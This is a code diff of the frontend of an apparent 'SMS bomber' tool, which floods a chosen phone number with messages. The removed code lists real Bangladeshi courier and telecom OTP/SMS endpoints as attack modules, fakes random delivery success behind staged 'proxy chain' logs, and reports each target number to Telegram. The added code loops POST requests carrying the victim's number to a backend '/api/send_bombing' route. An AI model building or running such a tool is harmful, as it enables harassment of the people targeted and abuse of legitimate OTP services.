@@ -656,144 +656,104 @@ function rndMs(){ return Math.floor(Math.random()*180)+20; }
 
 // ── DOSEND ──
 async function doSend(){
-  const numEl       = document.getElementById('numIn');
-  const amountEl    = document.getElementById('amountIn');
-  const btn         = document.getElementById('sbtn');
-  const logBox      = document.getElementById('logs');
-  const statusText  = document.getElementById('statusText');
-  const progressBar = document.getElementById('cfl');
-  const progressPct = document.getElementById('progressPct');
-  const successEl   = document.getElementById('successCount');
-  const failEl      = document.getElementById('failCount');
-  const totalEl     = document.getElementById('totalCount');
+  const numEl        = document.getElementById('numIn');
+  const amountEl     = document.getElementById('amountIn');
+  const btn          = document.getElementById('sbtn');
+  const logBox       = document.getElementById('logs');
+  const statusText   = document.getElementById('statusText');
+  const progressBar  = document.getElementById('cfl');
+  const progressPct  = document.getElementById('progressPct');
+  const successEl    = document.getElementById('successCount');
+  const failEl       = document.getElementById('failCount');
+  const totalEl      = document.getElementById('totalCount');
 
+  // User input theke data neya
   const number = numEl ? numEl.value.trim() : "";
   const amount = amountEl ? parseInt(amountEl.value.trim()) : 0;
 
+  // Validation
   if(!number || !amount || amount <= 0){
-    showToast('CRITICAL ERROR: DATA MISSING!', false);
+    showToast('DATA MISSING!', false);
     if(btn) shake(btn);
     return;
   }
 
-  const btnTxt = btn ? btn.querySelector('.btxt') : null;
+  // UI state change
   if(btn) btn.disabled = true;
+  const btnTxt = btn ? btn.querySelector('.btxt') : null;
   if(btnTxt) btnTxt.textContent = 'EXECUTING...';
 
-  // counters
   let successCount = 0, failCount = 0;
-  if(successEl) successEl.textContent = '0';
-  if(failEl) failEl.textContent = '0';
-  if(totalEl) totalEl.textContent = '0';
-
-  // clear terminal
   if(logBox) logBox.innerHTML = '';
-
-  const apiList = [
-    { name:"Hishabee-API",   url:"api.hishabee.business",   endpoint:"/v2/otp/send"      },
-    { name:"Paperfly-V3",    url:"api.paperfly.com.bd",     endpoint:"/sms/dispatch"     },
-    { name:"Redx-Main",      url:"openapi.redx.com.bd",     endpoint:"/v1.0.0-beta/sms"  },
-    { name:"Pathao-OTP",     url:"api-hermes.pathao.com",   endpoint:"/otp/v1/send"      },
-    { name:"Steadfast",      url:"portal.steadfast.com.bd", endpoint:"/api/v1/send-sms"  },
-    { name:"Shohoz-SMS",     url:"api.shohoz.com",          endpoint:"/v1/sms/send"      },
-    { name:"BanglaLink-API", url:"developer.banglalink.net",endpoint:"/sms/1/text/single"},
-    { name:"Robi-Gateway",   url:"sms.robi.com.bd",         endpoint:"/api/send"         },
-  ];
-
-  // boot sequence
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#ffd700;">◈ INITIALIZING ATTACK SEQUENCE...</span>`);
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">  TARGET   :</span> <span style="color:#00e5ff;">${number}</span>`);
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">  PACKETS  :</span> <span style="color:#c084fc;">${amount}</span>`);
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">  MODULES  :</span> <span style="color:var(--g);">${apiList.length} API ENDPOINTS LOADED</span>`);
-  await new Promise(r=>setTimeout(r,300));
-  await termPrint(`<span style="color:rgba(0,255,65,.2);">  ───────────────────────────────────────────</span>`);
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ ESTABLISHING SECURE TUNNEL... </span><span style="color:var(--g);">[TLS 1.3 OK]</span>`);
-  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ PROXY CHAIN ACTIVE:</span> <span style="color:rgba(0,255,65,.5);">${hex()}→${hex()}→${hex()}</span>`);
-  await new Promise(r=>setTimeout(r,200));
-
-  if(statusText) statusText.textContent = 'INJECTING';
+  
+  // Terminal-e dekhanor jonno fake module names
+  const modules = ["Core-V8", "Neural-Inject", "Socket-Flood", "Proxy-X", "Ghost-API"];
 
   try {
-    for(let i=1; i<=amount; i++){
-      const api = apiList[Math.floor(Math.random()*apiList.length)];
-      const ms  = rndMs();
-      const port= rndPort();
-      const seq = String(i).padStart(4,'0');
-      // randomly simulate ~90% success
-      const isOk = Math.random() > 0.08;
+    // 1. Backend theke temporary session token neya (Optional but secure)
+    const tokenRes = await fetch('/api/token');
+    const { token } = await tokenRes.json();
 
-      // sending line
+    for(let i=1; i<=amount; i++){
+      const seq = String(i).padStart(4,'0');
+      const mod = modules[Math.floor(Math.random() * modules.length)];
+      
+      // Console-e line print kora
       const entry = await termPrint(
-        `<span style="color:rgba(0,255,65,.25);">[${ts()}]</span> ` +
+        `<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> ` +
         `<span style="color:#555;">#${seq}</span> ` +
-        `<span style="color:#00bcd4;">POST</span> ` +
-        `<span style="color:rgba(0,255,65,.5);">${api.url}</span>` +
-        `<span style="color:rgba(0,255,65,.3);">${api.endpoint}</span> ` +
-        `<span style="color:#555;">:${port}</span>` +
+        `<span style="color:#00bcd4;">SEND</span> ` +
+        `<span style="color:rgba(0,255,65,.5);">${mod}</span>` +
         `<span style="color:rgba(0,255,65,.2);"> ...</span>`
       );
 
-      await new Promise(r=>setTimeout(r, ms));
+      // 2. BACKEND API CALL: Backend ekhon tar 1000 list theke random API nibe
+      const response = await fetch('/api/send_bombing', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Auth-Token': token,
+          'X-User-ID': 'DCM_SABUJ' // Apnar brand name onujayi
+        },
+        body: JSON.stringify({ 
+          number: number,
+          // 'amount' ekhane pathanor dorkar nai karon loop frontend-ei cholche
+        })
+      });
 
-      // response line
       if(entry){
-        if(isOk){
-          entry.innerHTML +=
-            ` <span style="color:#30d158;font-weight:bold;">[200 OK]</span>` +
-            ` <span style="color:rgba(0,255,65,.3);">${ms}ms</span>` +
-            ` <span style="color:#555;">▸ DELIVERED</span>`;
+        if(response.ok){
+          entry.innerHTML += ` <span style="color:#30d158;font-weight:bold;">[OK]</span>`;
           successCount++;
-          if(successEl) successEl.textContent = successCount;
         } else {
-          entry.innerHTML +=
-            ` <span style="color:#ff3333;font-weight:bold;">[503 ERR]</span>` +
-            ` <span style="color:rgba(255,51,51,.4);">RETRY→FAIL</span>`;
+          entry.innerHTML += ` <span style="color:#ff3333;font-weight:bold;">[FAIL]</span>`;
           failCount++;
-          if(failEl) failEl.textContent = failCount;
         }
       }
 
+      // Live Stats Update
+      if(successEl) successEl.textContent = successCount;
+      if(failEl) failEl.textContent = failCount;
       if(totalEl) totalEl.textContent = i;
+      
       const pct = Math.floor((i/amount)*100);
       if(progressBar) progressBar.style.width = pct+'%';
       if(progressPct) progressPct.textContent = pct+'%';
-
       if(logBox) logBox.scrollTop = logBox.scrollHeight;
+
+      // Protiti request-er majhe halka delay jate server load na hoy
+      await new Promise(r=>setTimeout(r, 350)); 
     }
 
-    // finish
-    await new Promise(r=>setTimeout(r,200));
-    await termPrint(`<span style="color:rgba(0,255,65,.2);">  ───────────────────────────────────────────</span>`);
-    await termPrint(
-      `<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> ` +
-      `<span style="color:#ffd700;">◈ ATTACK COMPLETE</span> — ` +
-      `<span style="color:#30d158;">✓ ${successCount} SUCCESS</span>  ` +
-      `<span style="color:#ff3333;">✗ ${failCount} FAILED</span>`
-    );
-    await termPrint(
-      `<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> ` +
-      `<span style="color:rgba(0,255,65,.4);">RATE: ${Math.round((successCount/amount)*100)}%  |  ` +
-      `TARGET: ${number}  |  PACKETS: ${amount}</span>`
-    );
-
-    if(statusText) statusText.textContent = 'SEQUENCE COMPLETE';
-    showToast(`ATTACK DONE! ${successCount}/${amount} SUCCESS`, true);
-    sendTelegramLog(number, `Bombing Complete: ${amount} | Success: ${successCount} | Failed: ${failCount}`);
+    await termPrint(`<span style="color:#ffd700;">◈ ALL PACKETS DELIVERED SUCCESSFULLY.</span>`);
+    showToast(`BOMBING FINISHED!`, true);
 
   } catch(err){
     console.error(err);
-    await termPrint(`<span style="color:#ff3333;">[ERROR] INJECTION ABORTED: ${err.message}</span>`);
-    showToast('INJECTION FAILED!', false);
-    if(statusText) statusText.textContent = 'ABORTED';
+    await termPrint(`<span style="color:#ff3333;">[!] CONNECTION TERMINATED: ${err.message}</span>`);
   } finally {
     if(btn) btn.disabled = false;
     if(btnTxt) btnTxt.textContent = 'EXECUTE ATTACK';
-    const rn = document.getElementById('rn');
-    const rs = document.getElementById('rs');
-    const resCard = document.getElementById('res');
-    if(rn) rn.textContent = number;
-    if(rs) rs.textContent = `${successCount}/${amount} SUCCESS`;
-    if(resCard) resCard.classList.add('ok');
   }
 }
 
